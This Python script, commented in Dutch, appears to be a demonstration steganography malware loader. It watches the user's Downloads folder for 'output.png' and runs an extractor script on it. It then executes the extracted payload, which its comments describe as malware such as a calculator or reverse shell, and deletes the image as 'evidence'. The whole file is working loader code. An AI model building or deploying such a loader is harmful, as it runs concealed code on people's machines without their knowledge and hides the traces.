import os
import time
import subprocess
from getpass import getuser

def start_watcher():
    # Bepaal de map waar dít script (watcher.py) staat
    base_dir = os.path.dirname(os.path.abspath(__file__))
    extractor_path = os.path.join(base_dir, "extractor.py")
    payload_output_path = "extracted_payload.py" # De extractor schrijft dit in de huidige map

    # 1. Bepaal het pad naar de Windows Downloads map
    username = getuser()
    download_path = f"C:\\Users\\{username}\\Downloads\\output.png"
    
    print(f"[*] Watcher is gestart. Ik hou {download_path} in de gaten...")

    while True:
        # 2. Check of het bestand bestaat
        if os.path.exists(download_path):
            print("\n[!] Bestand gedetecteerd in Downloads!")
            
            # 3. Voer de extractor uit met het volledige pad naar extractor.py
            print("[*] Bezig met extraheren van payload...")
            subprocess.run(["python", extractor_path, download_path])

            # 4. Voer de extracte payload (het script) uit
            if os.path.exists(payload_output_path):
                print("[!] Payload gevonden! Bezig met uitvoeren...")
                # Hier voeren we de 'malware' (calculator/reverse shell) uit
                subprocess.Popen(["python", payload_output_path])
                
                # 5. Opruimen (optioneel, voor de demo is het handig om het te verwijderen)
                os.remove(download_path)
                print("[*] Bewijsmateriaal verwijderd. Watcher gaat weer slapen.")
            
        # Wacht 2 seconden voor de volgende check om je CPU te sparen
        time.sleep(2)

if __name__ == "__main__":
    try:
        start_watcher()
    except KeyboardInterrupt:
        print("\nWatcher gestopt.")